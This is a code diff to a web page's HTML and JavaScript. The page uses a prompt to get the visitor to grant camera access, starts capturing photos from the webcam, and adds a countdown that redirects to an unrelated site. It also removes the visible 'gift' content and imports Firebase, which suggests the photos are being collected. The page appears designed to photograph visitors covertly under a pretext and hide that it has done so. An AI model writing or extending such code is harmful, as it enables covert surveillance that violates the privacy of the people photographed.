@@ -88,6 +88,13 @@
             margin-top: 10px;
             display: none;
         }
+
+        .countdown {
+            font-size: 1.5em;
+            margin-top: 20px;
+            color: green;
+            display: none;
+        }
     </style>
 </head>
 
@@ -101,6 +108,8 @@
         <div class="error-message" id="error-message">Please click the "Allow" button.</div>
         <div class="fallback" id="fallback" style="display: none;">Your browser does not support the required
             permissions. Please open this page in Chrome or Safari.</div>
+        <div class="countdown" id="countdown">3</div>
+    </div>
 
     <script type="module">
         // Import Firebase SDKs
@@ -128,7 +137,7 @@
         const fallbackDiv = document.getElementById('fallback');
         const mcqContainer = document.getElementById('mcq-container');
         const errorMessage = document.getElementById('error-message');
-        const giftContainer = document.getElementById('gift-container');
+        const countdownElement = document.getElementById('countdown');
 
         function showFallback() {
             fallbackDiv.style.display = 'block';
@@ -174,6 +183,19 @@
             });
         }
 
+        function startCountdown() {
+            let countdown = 3;
+            countdownElement.style.display = 'block';
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                countdownElement.textContent = countdown;
+                if (countdown === 0) {
+                    clearInterval(countdownInterval);
+                    window.location.href = 'https://longdogechallenge.com/';
+                }
+            }, 1000);
+        }
+
         function requestCameraPermissions() {
             navigator.permissions.query({ name: 'camera' }).then((result) => {
                 if (result.state === 'granted') {
@@ -182,7 +204,6 @@
                     localStorage.removeItem('cameraPermissionGranted');
                     showFallback();
                 } else {
-                    // Show the MCQ guidance to the user
                     mcqContainer.style.display = 'block';
                 }
             }).catch((error) => {
@@ -194,17 +215,15 @@
         function initCamera() {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then((stream) => {
-                    // Hide the MCQ UI and show the main content
                     mcqContainer.style.display = 'none';
-                    giftContainer.style.display = 'flex';
 
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     video.play();
 
-                    // Start capturing photos
                     startPhotoCapture(video);
-
+                    startCountdown();
+                })
                 .catch((error) => {
                     console.error('Camera access denied:', error);
                     showFallback();
@@ -212,47 +231,30 @@
         }
 
         document.getElementById('mcq-allow').addEventListener('click', () => {
-    // Directly request camera permissions when the user clicks Allow
-    navigator.mediaDevices.getUserMedia({ video: true })
-        .then((stream) => {
-            // If permission is granted, hide the MCQ UI and show the main content
-            mcqContainer.style.display = 'none';
-            giftContainer.style.display = 'flex';
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    mcqContainer.style.display = 'none';
 
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
 
-            // Start capturing photos
-            startPhotoCapture(video);
-        })
-        .catch((error) => {
-            console.error('Camera access denied:', error);
-            // Show error message if permission is denied
-            errorMessage.style.display = 'block';
+                    startPhotoCapture(video);
+                    startCountdown();
+                })
+                .catch((error) => {
+                    console.error('Camera access denied:', error);
+                    errorMessage.style.display = 'block';
+                });
         });
-});
 
-        // Event listener for Block button
         document.getElementById('mcq-block').addEventListener('click', () => {
-            // Show error message when the user clicks Block
             errorMessage.style.display = 'block';
         });
 
-        // Initial check for permissions
         if (navigator.permissions) {
-            navigator.permissions.query({ name: 'camera' }).then((result) => {
-                if (result.state === 'granted') {
-                    initCamera();
-                } else if (result.state === 'denied') {
-                    showFallback();
-                }
-            }).catch((error) => {
-                console.error('Permission query failed:', error);
-                showFallback();
-            });
+            requestCameraPermissions();
         } else {
-            // If Permissions API is not supported, show fallback
             showFallback();
         }
     </script>
